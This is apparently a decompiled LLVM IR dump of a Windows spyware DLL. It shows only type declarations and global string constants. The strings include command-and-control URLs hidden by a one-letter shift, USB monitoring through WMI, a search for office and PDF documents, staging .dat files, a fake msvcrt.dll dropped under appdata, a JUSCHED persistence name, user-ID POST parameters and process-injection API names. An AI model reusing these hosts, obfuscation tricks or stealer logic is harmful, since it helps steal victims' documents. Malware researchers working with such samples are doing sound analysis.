source_filename = "test"
target datalayout = "e-p:32:32-f64:32:64-f80:32-n8:16:32-S128"

%0 = type { i32, i32, i32, i32 }
%1 = type { i32, i32, i32, i32 }
%2 = type { i32, i32, i32, i32 }
%_RTL_CRITICAL_SECTION = type { %_RTL_CRITICAL_SECTION_DEBUG*, i32, i32, i32*, i32*, i32 }
%_RTL_CRITICAL_SECTION_DEBUG = type { i16, i16, %_RTL_CRITICAL_SECTION*, %_LIST_ENTRY, i32, i32, i32, i16, i16 }
%_LIST_ENTRY = type { %_LIST_ENTRY*, %_LIST_ENTRY* }
%vtable_1002d3b4_type = type { i32 (i8)*, i32 ()* }
%vtable_1002d3cc_type = type { i32 (i8)*, i32 ()* }
%vtable_1002d434_type = type { i32 (i8)*, i32 ()* }
%vtable_1002d44c_type = type { i32 (i8)*, i32 ()*, i32 (i32, i32)*, i32 (i32, i32)*, i32 (i32, i32)*, i32 (i32, i32)* }
%vtable_1002d474_type = type { i32 (i32)* }
%vtable_1002d4bc_type = type { i32 (i32)*, i32 ()*, i32 ()*, i32 ()*, i32 (i32)*, i32 ()*, i32 ()*, i32 ()*, i32 (i32, i32, i32)*, i32 (i32, i32, i32)*, i32 (i64, i32, i32)*, i32 (i32, i32)*, i32 (i8*, i64)*, i32 ()*, i32 (i32*)* }
%vtable_1002d4fc_type = type { i32 (i32)* }
%vtable_1002d504_type = type { i32 (i32)* }
%vtable_1002d558_type = type { i32 (i32)*, i32 ()* }
%vtable_1002d574_type = type { i32 (i32)*, i32 ()* }
%vtable_1002d58c_type = type { i32 (i32)*, i32 ()* }
%vtable_1002e09c_type = type { i32 (i8)*, i32 ()*, i32 ()*, i32 (i32, i32, i32, i32, i32, i32)*, i32 (i32, i32, i32, i32, i32, i64)*, i32 (i32, i32, i32, i32, i32, i64)*, i32 (i32, i32, i32, i32, i32, i32, i32)*, i32 (i32, i32, i32, i32, i32, i32, i32)*, i32 (i32, i32, i32, i32, i32, i32)*, i32 (i32, i32, i32, i32, i32, i32)*, i32 (i32, i32, i32, i32, i8, i8)* }
%vtable_1002e0cc_type = type { i32 (i8)*, i32 ()*, i32 ()*, i32 ()*, i32 ()*, i32 (i32)*, i32 (i32)*, i32 (i32)* }
%vtable_10030658_type = type { i32 (i32)* }
%vtable_10030664_type = type { i32 (i32)*, i32 ()* }
%vtable_10039d30_type = type { i32 (i32)*, i32 ()* }
%__MIDL___MIDL_itf_mfobjects_0000_0008_0002 = type { %__MIDL___MIDL_itf_mfobjects_0000_0008_0001, [1 x i32] }
%__MIDL___MIDL_itf_mfobjects_0000_0008_0001 = type { i32, i32, i32, i16, i16, i32, i32, i32, i32, i32, i32 }
%_SECURITY_ATTRIBUTES = type { i32, i32*, i1 }
%_OVERLAPPED = type { i32, i32, i32, i32* }
%_SYSTEMTIME = type { i16, i16, i16, i16, i16, i16, i16, i16 }
%tagRECT = type { i32, i32, i32, i32 }
%tagSOLE_AUTHENTICATION_SERVICE = type { i32, i32, i16*, i32 }
%tagINPUT = type { i32, i32 }
%lconv = type { i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8, i8, i8, i8, i8, i8, i8, i8, i8, i8, i8, i8, i8, i8 }
%addrinfo = type { i32, i32, i32, i32, i32, i8*, %sockaddr*, %addrinfo* }
%sockaddr = type { i16, [14 x i8] }
%in_addr = type { i32 }
%tagMSG = type { i32*, i32, i32, i32, i32, %tagPOINT }
%tagPOINT = type { i32, i32 }
%tagWNDCLASSW = type { i32, i32 (i32*, i32, i32, i32)*, i32, i32, i32*, i32*, i32*, i32*, i16*, i16* }
%_OSVERSIONINFOW = type { i32, i32, i32, i32, i32, [128 x i16] }
%_WIN32_FIND_DATAW = type { i32, %_FILETIME, %_FILETIME, %_FILETIME, i32, i32, i32, i32, [1 x i16], [14 x i16], i32, i32, i16 }
%_FILETIME = type { i32, i32 }
%_STARTUPINFOW = type { i32, i16*, i16*, i16*, i32, i32, i32, i32, i32, i32, i32, i32, i16, i16, i8*, i32*, i32*, i32* }
%_PROCESS_INFORMATION = type { i32*, i32*, i32, i32 }
%_CONTEXT = type { i32, i32, i32, i32, i32, i32, i32, i32, i16, i16, i16, i16, i16, i16, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, [26 x %_M128A], i32, i32, i32, i32, i32, i32 }
%_M128A = type { i32, i64 }
%_TOKEN_PRIVILEGES = type { i32, [1 x %_LUID_AND_ATTRIBUTES] }
%_LUID_AND_ATTRIBUTES = type { %_LUID, i32 }
%_LUID = type { i32, i32 }
%hostent = type { i8*, i8**, i16, i16, i8** }
%_WIN32_FIND_DATAA = type { i32, %_FILETIME, %_FILETIME, %_FILETIME, i32, i32, i32, i32, [1 x i8], [14 x i8], i32, i32, i16 }
%_IO_FILE = type { i32 }
%__locale_struct = type { [13 x %__locale_data*], i16*, i32*, i32*, [13 x i8*] }
%__locale_data = type { i32 }
%_cpinfo = type { i32, [1 x i8], [1 x i8] }
%_TYPEDEF_fenv_t = type { i16, i16, i16, i16, i16, i16, i32, i16, i32, i32, i32, i16, i16, i32 }
%_EXCEPTION_RECORD = type { i32, i32, %_EXCEPTION_RECORD*, i32*, i32, [1 x i32] }

@0 = external local_unnamed_addr global i32
@1 = external local_unnamed_addr global i32
@2 = external local_unnamed_addr global i32
@3 = external local_unnamed_addr global i32
@global_var_10041ab4 = global i32 0
@global_var_10041ac4 = local_unnamed_addr global i32 0
@global_var_10041ac8 = local_unnamed_addr global i32 0
@global_var_1003f011 = local_unnamed_addr global i32 0
@global_var_10041ad0 = global i32 0
@global_var_10039d3c = constant i32 268439984
@global_var_10039c38 = constant [18 x i8] c"Unknown exception\00"
@global_var_1002d3c0 = constant i32 268440256
@global_var_10039c4c = constant [9 x i8] c"bad cast\00"
@global_var_1003e084 = local_unnamed_addr global i32 -1153374642
@global_var_10039c58 = constant [16 x i8] c"bad locale name\00"
@global_var_1003c20c = local_unnamed_addr constant i32 0
@global_var_1002d3d8 = constant i32 268440896
@global_var_1002d3e8 = constant i32 268441776
@global_var_1002d418 = constant i32 268441872
@global_var_10039c78 = constant [3 x i8] c": \00"
@global_var_1002d440 = constant i32 268442672
@global_var_10039c7c = constant [9 x i8] c"iostream\00"
@global_var_10039c88 = constant [22 x i8] c"iostream stream error\00"
@global_var_1002d468 = constant i32 268442672
@global_var_10039ca0 = constant [21 x i8] c"ios_base::badbit set\00"
@global_var_1003c2cc = constant i32 0
@global_var_10039cb8 = constant [22 x i8] c"ios_base::failbit set\00"
@global_var_10039cd0 = constant [21 x i8] c"ios_base::eofbit set\00"
@global_var_1003fd8c = local_unnamed_addr global i32 0
@global_var_1003928c = constant [11 x i16] %wide-string
@global_var_10040fb0 = global i32 0
@global_var_10040fb4 = local_unnamed_addr global i32 0
@global_var_10040fb8 = local_unnamed_addr global i32 0
@global_var_10040fbc = local_unnamed_addr global i32 0
@global_var_1003fd88 = local_unnamed_addr global i32 0
@global_var_1003926c = constant [14 x i8] c"GetWindowRect\00"
@global_var_1003927c = local_unnamed_addr constant [16 x i8] c"GdiplusShutdown\00"
@global_var_10040fba = local_unnamed_addr global i32 0
@global_var_10040fc0 = local_unnamed_addr global i32 0
@global_var_10040fc4 = local_unnamed_addr global i32 0
@global_var_10040fc8 = local_unnamed_addr global i32 0
@global_var_100410a4 = local_unnamed_addr global i32 0
@global_var_10039da0 = local_unnamed_addr constant [8 x i16] %wide-string
@global_var_1003e9c0 = local_unnamed_addr global i32 -1
@global_var_100410a0 = global i32 0
@global_var_100410ac = local_unnamed_addr global i32 0
@global_var_10040590 = local_unnamed_addr global i32 0
@global_var_1003e9c4 = global i32 65279
@global_var_100392a8 = constant [40 x i16] %wide-string
@global_var_1003fd92 = global i32 0
@global_var_100036f8 = local_unnamed_addr constant i32 268447765
@global_var_100392a4 = constant i32 32
@global_var_10039d90 = local_unnamed_addr constant [8 x i16] %wide-string
@global_var_100392f8 = constant i32 43
@global_var_100392fc = constant i32 45
@global_var_10039300 = constant i32 48
@global_var_10039304 = constant i32 49
@global_var_10039308 = constant i32 50
@global_var_1003930c = constant i32 51
@global_var_10039310 = constant i32 52
@global_var_10039314 = constant i32 53
@global_var_10039318 = constant i32 54
@global_var_1003931c = constant i32 55
@global_var_10039320 = constant i32 56
@global_var_10039324 = constant i32 57
@global_var_10039328 = constant i32 42
@global_var_1003932c = constant i32 43
@global_var_10039330 = constant i32 45
@global_var_10039334 = constant i32 46
@global_var_10039338 = constant i32 47
@global_var_100410a8 = global i32 0
@global_var_1003933c = constant [13 x i8] c"kernel32.dll\00"
@global_var_1003934c = local_unnamed_addr constant [7 x i16] %wide-string
@global_var_1003935c = constant i32 0
@global_var_10040594 = local_unnamed_addr global i32 0
@global_var_100393a8 = constant [15 x i8] c"STARTED!!!!!!\0A\00"
@global_var_100393b8 = local_unnamed_addr constant [50 x i8] c"Failed to initialize COM library. Error code = 0x\00"
@global_var_1003f018 = local_unnamed_addr global i32 0
@global_var_100393ec = local_unnamed_addr constant [47 x i8] c"Failed to initialize security. Error code = 0x\00"
@global_var_100305f8 = constant i32 -602757497
@global_var_100305e8 = constant i32 1167128593
@global_var_1003942c = local_unnamed_addr constant [38 x i8] c"Failed to create IWbemLocator object.\00"
@global_var_1003941c = local_unnamed_addr constant [15 x i8] c" Err code = 0x\00"
@global_var_10039454 = constant [11 x i16] %wide-string
@global_var_1003946c = local_unnamed_addr constant [35 x i8] c"Could not connect. Error code = 0x\00"
@global_var_10039490 = local_unnamed_addr constant [45 x i8] c"Could not set proxy blanket. Error code = 0x\00"
@global_var_100394c0 = constant [27 x i8] c"SELECT * FROM Win32_USBHub\00"
@global_var_100394dc = constant [4 x i8] c"WQL\00"
@global_var_100394e0 = local_unnamed_addr constant [15 x i8] c"Not Connected\0A\00"
@global_var_1002d234 = local_unnamed_addr constant i32 -2147483639
@global_var_100394f0 = constant [5 x i16] %wide-string
@global_var_100394fc = constant [27 x i8] c"SELECT * FROM Win32_USBHub\00"
@global_var_10039518 = constant [4 x i8] c"WQL\00"
@global_var_1003951c = local_unnamed_addr constant [15 x i8] c"Not Connected\0A\00"
@global_var_1003952c = constant [5 x i16] %wide-string
@global_var_10039538 = constant [16 x i8] c"\0Ausb connected\0A\00"
@global_var_10039548 = constant [19 x i8] c"orginal > current\0A\00"
@global_var_1003955c = constant [20 x i8] c"orginal == current\0A\00"
@global_var_10039ce8 = constant [3 x i8] c"%p\00"
@global_var_10039cec = constant [3 x i8] c"Lu\00"
@global_var_10039cf0 = constant [3 x i8] c"Ld\00"
@global_var_10039cf4 = constant [3 x i8] c"lu\00"
@global_var_10039cf8 = constant [3 x i8] c"ld\00"
@global_var_10039cfc = constant [16 x i8] c"string too long\00"
@global_var_10039d0c = constant [3 x i8] c"eE\00"
@global_var_10039d10 = constant [3 x i8] c"pP\00"
@global_var_10039d14 = constant [24 x i8] c"invalid string position\00"
@global_var_1003f0f0 = local_unnamed_addr global i32 0
@global_var_10041ae0 = local_unnamed_addr global i32 0
@global_var_1003f0d4 = local_unnamed_addr global i32 0
@global_var_1003c278 = constant i32 0
@global_var_1003f610 = local_unnamed_addr global i32 0
@global_var_10041ae8 = global i32 0
@global_var_10041aec = local_unnamed_addr global i32 0
@global_var_10041ae4 = local_unnamed_addr global i32 0
@global_var_10041adc = local_unnamed_addr global i32 0
@global_var_10041af4 = local_unnamed_addr global i32 0
@global_var_10041ad8 = local_unnamed_addr global i32 0
@global_var_10039c68 = constant [6 x i8] c"false\00"
@global_var_10039c70 = constant [5 x i8] c"true\00"
@global_var_100419c8 = local_unnamed_addr global i32 0
@global_var_10039574 = local_unnamed_addr constant [21 x i8] c"SetHandleInformation\00"
@global_var_100419d4 = local_unnamed_addr global i32 0
@global_var_100419b4 = local_unnamed_addr global i32 0
@global_var_10041a84 = global i32 0
@global_var_10041a74 = local_unnamed_addr global i32 0
@global_var_10041a6c = local_unnamed_addr global i32 0
@global_var_10039590 = constant [13 x i8] c"GetTempPathA\00"
@global_var_100395a0 = constant [4 x i8] c"%d\0A\00"
@global_var_1003e9f4 = global [13 x i8] c"lfsofm43/emm\00"
@global_var_1003e9f8 = local_unnamed_addr global [9 x i8] c"fm43/emm\00"
@global_var_1003e9fc = local_unnamed_addr global [5 x i8] c"/emm\00"
@global_var_1003ea00 = local_unnamed_addr global i32 0
@global_var_100419cc = local_unnamed_addr global i32 0
@global_var_100395a4 = constant [5 x i8] c"%02x\00"
@global_var_100395ac = constant [5 x i8] c"%02x\00"
@global_var_100395b4 = constant [10 x i8] c"HeapAlloc\00"
@global_var_10041a70 = local_unnamed_addr global i32 0
@global_var_100395d0 = constant [8 x i8] c"appdata\00"
@global_var_100395d8 = constant [32 x i8] c"\5CMicrosoft\5CTemplates\5Cmsvcrt.dll\00"
@global_var_10039600 = local_unnamed_addr constant [6 x i8] c"dfgfg\00"
@global_var_100395f8 = local_unnamed_addr constant [14 x i8] c"asdfg.asdfgfg\00"
@global_var_10039604 = local_unnamed_addr constant i32 103
@global_var_10039608 = local_unnamed_addr constant [13 x i8] c"CreateThread\00"
@global_var_10039618 = constant [13 x i8] c"DMCZ0001.dat\00"
@global_var_1003e9d8 = constant [23 x i8] c"ouemm/emm!!!!!!!!!!!!!\00"
@global_var_1003e9c8 = constant [13 x i8] c"bewbqj43/emm\00"
@global_var_10041a3c = global i32 0
@global_var_10041a40 = local_unnamed_addr global i32 0
@global_var_10041a44 = local_unnamed_addr global i32 0
@global_var_10041a48 = local_unnamed_addr global i32 0
@global_var_100419dc = local_unnamed_addr global i32 0
@global_var_100419e0 = local_unnamed_addr global i32 0
@global_var_100419e4 = local_unnamed_addr global i32 0
@global_var_100419e8 = local_unnamed_addr global i32 0
@global_var_10039628 = constant [14 x i8] c"SfhPqfoLfzFyX\00"
@global_var_10039638 = constant [15 x i8] c"SfhTfuWbmvfFyX\00"
@global_var_10039648 = constant [8 x i8] c"JUSCHED\00"
@global_var_10039650 = constant [8 x i16] %wide-string
@global_var_100419bc = local_unnamed_addr global i32 0
@global_var_10041a64 = local_unnamed_addr global i32 0
@global_var_10039660 = constant [5 x i8] c"uid=\00"
@global_var_10039668 = local_unnamed_addr constant [4 x i8] c"&u=\00"
@global_var_1003966c = constant [13 x i8] c"GetUserNameW\00"
@global_var_1003967c = constant [5 x i8] c"%04x\00"
@global_var_10039684 = constant [5 x i8] c"UNIC\00"
@global_var_1003968c = constant [5 x i8] c"%04x\00"
@global_var_10039694 = local_unnamed_addr constant [5 x i8] c"UNIC\00"
@global_var_1003969c = constant i32 63
@global_var_100395cc = constant [4 x i8] c"%d\0A\00"
@global_var_10039db0 = local_unnamed_addr constant [8 x i16] %wide-string
@global_var_100396a8 = constant [50 x i8] c"iuuq;00xxx/xfcstt/dpn0dsfbufgffe/qiq@gffeje>5:423\00"
@global_var_100396dc = constant [39 x i8] c"iuuq;00gffe54/dpn04744314394148136/ynm\00"
@global_var_10039704 = constant [54 x i8] c"iuuqt;00bteg589/xpseqsftt/dpn031280130240ij.fwfszpof0\00"
@global_var_10039758 = constant [70 x i8] c"iuuqt;00sbx/hjuivcvtfsdpoufou/dpn0efwpolfbsot0zushgws0nbtufs0ynm/ynm!\00"
@global_var_100397a0 = constant [21 x i8] c"di1jdf/dsbcebodf/dpn\00"
@global_var_1003973c = constant [25 x i8] c"di11tf/dijdlfoljmmfs/dpn\00"
@global_var_10039dc0 = local_unnamed_addr constant [16 x i8] c"wininet.dll    \00"
@global_var_10041a80 = local_unnamed_addr global i32 0
@global_var_100419d0 = local_unnamed_addr global i32 0
@global_var_100419b0 = local_unnamed_addr global i32 0
@global_var_10041a68 = local_unnamed_addr global i32 0
@global_var_100419c0 = local_unnamed_addr global i32 0
@global_var_10041a38 = local_unnamed_addr global i32 0
@global_var_10041a00 = local_unnamed_addr global i32 0
@global_var_10041a7c = local_unnamed_addr global i32 0
@global_var_10041a78 = local_unnamed_addr global i32 0
@global_var_10039e30 = local_unnamed_addr constant [16 x i8] c"form-urlencoded\00"
@global_var_10041a08 = local_unnamed_addr global i32 0
@global_var_100419c4 = local_unnamed_addr global i32 0
@global_var_100397b8 = constant [3 x i8] c"ok\00"
@global_var_100397d0 = local_unnamed_addr constant [5 x i8] c"/emm\00"
@global_var_100397c8 = local_unnamed_addr constant [13 x i8] c"lfsofm43/emm\00"
@global_var_100397d4 = local_unnamed_addr constant i32 0
@global_var_100397d8 = local_unnamed_addr constant [15 x i8] c"CreateProcessA\00"
@global_var_100397e8 = local_unnamed_addr constant [24 x i8] c"GetEnvironmentVariableA\00"
@global_var_10039800 = constant [8 x i8] c"appdata\00"
@global_var_10039808 = local_unnamed_addr constant [17 x i8] c"SetThreadContext\00"
@global_var_10039824 = local_unnamed_addr constant [5 x i8] c"/emm\00"
@global_var_1003981c = local_unnamed_addr constant [13 x i8] c"lfsofm43/emm\00"
@global_var_10039828 = local_unnamed_addr constant i32 0
@global_var_1003982c = constant [12 x i8] c"FreeLibrary\00"
@global_var_10039838 = constant [19 x i16] %wide-string
@global_var_100397bc = constant [5 x i16] %wide-string
@global_var_1003987c = local_unnamed_addr constant [8 x i16] %wide-string
@global_var_1003988c = constant [3 x i8] c"{{\00"
@global_var_10039890 = constant [3 x i8] c"}}\00"
@global_var_10039894 = constant [8 x i8] c"http://\00"
@global_var_1003989c = constant [9 x i8] c"https://\00"
@global_var_100398a8 = constant [8 x i8] c"http://\00"
@global_var_100398b0 = constant [9 x i8] c"https://\00"
@global_var_100398bc = constant [5 x i8] c"&r=1\00"
@global_var_100398c4 = constant [14 x i8] c"404 Not Found\00"
@global_var_100398d4 = constant [3 x i8] c"{{\00"
@global_var_100398d8 = constant [3 x i8] c"}}\00"
@global_var_100398dc = constant [8 x i8] c"http://\00"
@global_var_100398e4 = constant [9 x i8] c"https://\00"
@global_var_100398f0 = constant [10 x i8] c"WriteFile\00"
@global_var_100398fc = constant [12 x i8] c"CreateFileW\00"
@global_var_10039908 = constant [3 x i8] c"||\00"
@global_var_1003990c = constant [4 x i8] c"&yy\00"
@global_var_10039910 = constant [3 x i8] c"=1\00"
@global_var_10039914 = constant [4 x i8] c"&tt\00"
@global_var_10039918 = constant [4 x i8] c"&tt\00"
@global_var_1003991c = constant i32 61
@global_var_10039920 = constant [4 x i8] c"&zz\00"
@global_var_10039924 = constant [3 x i8] c"=1\00"
@global_var_10039a60 = constant [9 x i8] c"TY10.dat\00"
@global_var_10039a6c = local_unnamed_addr constant [13 x i8] c"CreateThread\00"
@global_var_10039a7c = constant [3 x i16] %wide-string
@global_var_10041a0c = local_unnamed_addr global i32 0
@global_var_100419b8 = local_unnamed_addr global i32 0
@global_var_10039a8c = local_unnamed_addr constant [13 x i8] c"DMCZ0001.dat\00"
@global_var_10039a90 = local_unnamed_addr constant [9 x i8] c"0001.dat\00"
@global_var_10039a94 = local_unnamed_addr constant [5 x i8] c".dat\00"
@global_var_10039a9c = local_unnamed_addr constant [13 x i8] c"DMCZ0001.dat\00"
@global_var_10039aa0 = local_unnamed_addr constant [9 x i8] c"0001.dat\00"
@global_var_10039aa4 = local_unnamed_addr constant [5 x i8] c".dat\00"
@global_var_10039a84 = constant [6 x i8] c"POST \00"
@global_var_10039aac = local_unnamed_addr constant [5 x i8] c"&r=1\00"
@global_var_10039ab4 = constant [13 x i8] c"kernel32.dll\00"
@global_var_10039ac4 = constant [8 x i8] c"dpoofdu\00"
@global_var_10039acc = constant [8 x i8] c"connect\00"
@global_var_10039af0 = constant [3 x i8] c"\5C*\00"
@global_var_10039af4 = constant i32 92
@global_var_10039af8 = constant i32 92
@global_var_10039afc = constant [5 x i8] c".pdf\00"
@global_var_10039b04 = constant [5 x i8] c".doc\00"
@global_var_10039b0c = constant [6 x i8] c".docx\00"
@global_var_10039b14 = constant [5 x i8] c".ppt\00"
@global_var_10039b1c = constant [6 x i8] c".pptx\00"
@global_var_10039b24 = constant [5 x i8] c".txt\00"
@global_var_10039b2c = constant i32 92
@global_var_10039b30 = constant i32 48
@global_var_10039b34 = constant [6 x i8] c"HUGE:\00"
@global_var_10039b3c = constant i32 92
@global_var_10039b40 = constant [21 x i8] c"::size crosses 10 MB\00"
@global_var_10039d44 = constant [63 x i8] c"0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz\00"
@global_var_10039b58 = constant [14 x i8] c"TZ0000002.dat\00"
@global_var_10039b68 = constant [5 x i8] c".pdf\00"
@global_var_10039b70 = constant [5 x i8] c".doc\00"
@global_var_10039b78 = constant [6 x i8] c".docx\00"
@global_var_10039b80 = constant [5 x i8] c".ppt\00"
@global_var_10039b88 = constant [6 x i8] c".pptx\00"
@global_var_10039b90 = constant [5 x i8] c".txt\00"
@global_var_10039b98 = constant [5 x i8] c"SMB\5C\00"
@global_var_10039ba0 = constant [4 x i8] c"C:\5C\00"
@global_var_10039ba4 = local_unnamed_addr constant [9 x i8] c"\5CMUT.dat\00"
@global_var_10039bb0 = local_unnamed_addr constant [15 x i8] c"\5CTZ0000002.dat\00"
@global_var_10041a88 = local_unnamed_addr global i32 0
@global_var_10039bc0 = constant [13 x i8] c"CreateThread\00"
@global_var_10039bd0 = constant [34 x i8] c"GetVolumeNameForVolumeMountPointA\00"
@global_var_10039bf4 = constant [13 x i8] c"kernel32.dll\00"
@global_var_10039c04 = constant [3 x i8] c"\5C*\00"
@global_var_10039c08 = constant [6 x i8] c"SMB\5C*\00"
@global_var_10039c10 = constant [8 x i8] c"MUT.dat\00"
@global_var_10039c18 = constant [14 x i8] c"TZ0000001.dat\00"
@global_var_10039c28 = constant [14 x i8] c"TZ0000002.dat\00"
@global_var_1003f0dc = local_unnamed_addr global i32 0
@global_var_1003e064 = local_unnamed_addr global i32 268505824
@global_var_1003ba80 = local_unnamed_addr constant i32 -28
@global_var_100305e4 = constant i32 268505744
@global_var_1003baf4 = local_unnamed_addr constant i32 0
@global_var_10030608 = constant [33 x i16] %wide-string
@global_var_1002e0ec = constant [13 x i16] %wide-string
@global_var_1002e32c = constant [28 x i8] c"InitializeConditionVariable\00"
@global_var_1002e37c = constant [25 x i8] c"SleepConditionVariableCS\00"
@global_var_1002e360 = constant [25 x i8] c"WakeAllConditionVariable\00"
@global_var_1003f2bc = local_unnamed_addr global i32 0
@global_var_1003f2b8 = global i32 0
@global_var_1003f2c0 = local_unnamed_addr global i32 0
@global_var_1003f2c4 = local_unnamed_addr global i32 0
@global_var_1003f5ec = global i32 0
@global_var_1003f5f8 = global i32 0
@global_var_1003bb48 = constant i32 -2
@global_var_1003f5e4 = local_unnamed_addr global i32 0
@global_var_1002d380 = constant i32 0
@global_var_1002d364 = constant i32 0
@global_var_1002d360 = constant i32 0
@global_var_1002d330 = constant i32 0
@global_var_1003f608 = local_unnamed_addr global i32 0
@global_var_1003bb68 = constant i32 -2
@global_var_1003f60c = local_unnamed_addr global i32 0
@global_var_1003f614 = local_unnamed_addr global i32 0
@global_var_1003e090 = local_unnamed_addr global i32 1
@global_var_1003f618 = local_unnamed_addr global i32 0
@global_var_10041afc = local_unnamed_addr global i32 0
@global_var_1003f620 = global i32 0
@global_var_1003f628 = global i32 0
@global_var_10041af8 = global i32 0
@global_var_1003f67c = local_unnamed_addr global i32 0
@global_var_100306c4 = external constant i32
@global_var_100306d0 = local_unnamed_addr constant [30 x i16] %wide-string
@global_var_1003070c = local_unnamed_addr constant [29 x i16] %wide-string
@global_var_10030748 = local_unnamed_addr constant [9 x i16] %wide-string
@global_var_1003075c = constant [8 x i16] %wide-string
@global_var_1003076c = constant [8 x i16] %wide-string
@global_var_1003f640 = global i32 0
@global_var_10030784 = constant i32 0
@global_var_1003077c = constant i32 0
@global_var_1002e108 = constant [9 x i8] c"FlsAlloc\00"
@global_var_1003078c = constant i32 0
@global_var_1002e114 = constant [8 x i8] c"FlsFree\00"
@global_var_10030794 = constant i32 0
@global_var_1002e11c = constant [12 x i8] c"FlsGetValue\00"
@global_var_1002e128 = constant [12 x i8] c"FlsSetValue\00"
@global_var_100307a4 = constant i32 0
@global_var_1002e134 = constant [28 x i8] c"InitializeCriticalSectionEx\00"
@global_var_1003f654 = global i32 0
@global_var_1003e0a0 = local_unnamed_addr global i32 -1
@global_var_1002d32c = local_unnamed_addr constant i32 268452752
@global_var_1003e0b0 = local_unnamed_addr global i32 429065504
@global_var_1003bd20 = constant i32 -28
@global_var_1003f6d8 = local_unnamed_addr global i32 0
@global_var_1003f6dc = local_unnamed_addr global i32 0
@global_var_1003f958 = global i32 0
@global_var_1003f964 = global i32 0
@global_var_1002d39c = constant i32 0
@global_var_1002d38c = constant i32 0
@global_var_1002d3a4 = constant i32 0
@global_var_1002d3a0 = constant i32 0
@global_var_1003bd48 = constant i32 -2
@global_var_1003fc58 = local_unnamed_addr global i32 0
@global_var_1003e2e8 = external global i32
@global_var_10031498 = constant i32 2097184
@global_var_1003e230 = global i32* @global_var_10031498
@global_var_1003e688 = global i32 0
@global_var_1003e2ec = local_unnamed_addr global i32* @global_var_1003e688
@global_var_1003f700 = global i32 0
@global_var_1003f838 = local_unnamed_addr global i32 0
@global_var_10031028 = constant i32 1
@global_var_1003102c = constant i32 22
@global_var_1003bda8 = constant i32 -2
@global_var_1003f6e8 = local_unnamed_addr global i32 0
@global_var_1003f6e4 = local_unnamed_addr global i32 0
@global_var_1003bd88 = constant i32 -2
@global_var_1003fa48 = global i32 0
@global_var_1003be30 = constant i32 -2
@global_var_1003be50 = constant i32 -2
@global_var_1003f6ec = local_unnamed_addr global i32 0
@global_var_1003e1f8 = global i32 0
@global_var_1003be90 = constant i32 -2
@global_var_10031718 = constant i32 50462976
@global_var_10031898 = constant i32 50462976
@global_var_1003fc78 = local_unnamed_addr global i32 0
@global_var_10032360 = local_unnamed_addr constant [4 x i8] c"pow\00"
@global_var_10033390 = local_unnamed_addr constant i32 0
@global_var_1003fd64 = local_unnamed_addr global i32 0
@global_var_1003fd68 = local_unnamed_addr global i32 0
@global_var_1003bed0 = constant i32 -2
@global_var_1003bef0 = constant i32 -2
@global_var_1003e8a8 = local_unnamed_addr global i32* @global_var_1003e688
@global_var_1003fc50 = local_unnamed_addr global i32 0
@global_var_1003fc54 = local_unnamed_addr global i32 0
@global_var_1003fd6c = local_unnamed_addr global i32 0
@global_var_10032488 = external constant i32
@global_var_100324d8 = local_unnamed_addr constant [35 x i16] %wide-string
@global_var_10032520 = local_unnamed_addr constant [32 x i16] %wide-string
@global_var_10032560 = local_unnamed_addr constant [28 x i16] %wide-string
@global_var_10032598 = local_unnamed_addr constant [36 x i16] %wide-string
@global_var_100325e0 = local_unnamed_addr constant [45 x i16] %wide-string
@global_var_10032640 = local_unnamed_addr constant [38 x i16] %wide-string
@global_var_1003268c = local_unnamed_addr constant [30 x i16] %wide-string
@global_var_100326c8 = local_unnamed_addr constant [31 x i16] %wide-string
@global_var_10032708 = local_unnamed_addr constant [29 x i16] %wide-string
@global_var_10032744 = local_unnamed_addr constant [30 x i16] %wide-string
@global_var_10032780 = local_unnamed_addr constant [39 x i16] %wide-string
@global_var_100327d0 = local_unnamed_addr constant [43 x i16] %wide-string
@global_var_10032828 = local_unnamed_addr constant [43 x i16] %wide-string
@global_var_10032880 = local_unnamed_addr constant [35 x i16] %wide-string
@global_var_100328c8 = local_unnamed_addr constant [39 x i16] %wide-string
@global_var_10032918 = local_unnamed_addr constant [9 x i16] %wide-string
@global_var_1003292c = local_unnamed_addr constant [7 x i16] %wide-string
@global_var_10032410 = constant i32 268551258
@global_var_1003fa40 = local_unnamed_addr global i32 0
@global_var_1003bf30 = constant i32 -2
@global_var_1003f970 = global i32 0
@global_var_1003294c = constant [20 x i8] c"EnumSystemLocalesEx\00"
@global_var_10032944 = constant i32 4
@global_var_1002e468 = constant [16 x i8] c"GetLocaleInfoEx\00"
@global_var_10032998 = constant [25 x i8] c"GetUserDefaultLocaleName\00"
@global_var_100329c4 = constant [18 x i8] c"IsValidLocaleName\00"
@global_var_100329e8 = constant [17 x i8] c"LCIDToLocaleName\00"
@global_var_100329d8 = constant i32 4
@global_var_1002e478 = constant [14 x i8] c"LCMapStringEx\00"
@global_var_10032a04 = constant [17 x i8] c"LocaleNameToLCID\00"
@global_var_100329fc = constant i32 4
@global_var_1003fa44 = local_unnamed_addr global i32 0
@global_var_10032980 = constant i32 0
@global_var_1002e2ac = constant [20 x i8] c"GetCurrentPackageId\00"
@global_var_1003bf70 = constant i32 -2
@global_var_1003bf90 = constant i32 -2
@global_var_1003bfb0 = constant i32 -2
@global_var_1003bf50 = constant i32 -2
@global_var_1003e1f0 = local_unnamed_addr global i32 -1
@global_var_1003fc5c = global i32 0
@global_var_1003c030 = constant i32 -2
@global_var_1003c050 = constant i32 -2
@global_var_1003e170 = local_unnamed_addr global i32 46
@global_var_1003f6f0 = local_unnamed_addr global i32 0
@global_var_10031192 = local_unnamed_addr constant i32 2097184
@global_var_1003e22c = local_unnamed_addr global i32 1
@global_var_1003c010 = constant i32 -2
@global_var_10032ba8 = constant [3 x i16] %wide-string
@global_var_10032a6c = external constant i32
@global_var_10032ab8 = local_unnamed_addr constant [11 x i16] %wide-string
@global_var_10032b14 = local_unnamed_addr constant [8 x i16] %wide-string
@global_var_10032bb0 = constant i32 59
@global_var_10032b28 = constant i32 67305985
@global_var_10031194 = constant i32 2097184
@global_var_1003e228 = local_unnamed_addr global i32* @global_var_10031194
@global_var_10032a68 = local_unnamed_addr constant i32 268561950
@global_var_1003c070 = constant i32 -2
@global_var_1003c090 = constant i32 -2
@global_var_1003fc60 = local_unnamed_addr global i32 0
@global_var_1003fc64 = local_unnamed_addr global i32 0
@global_var_1003c130 = constant i32 -2
@global_var_1003fc70 = local_unnamed_addr global i32 0
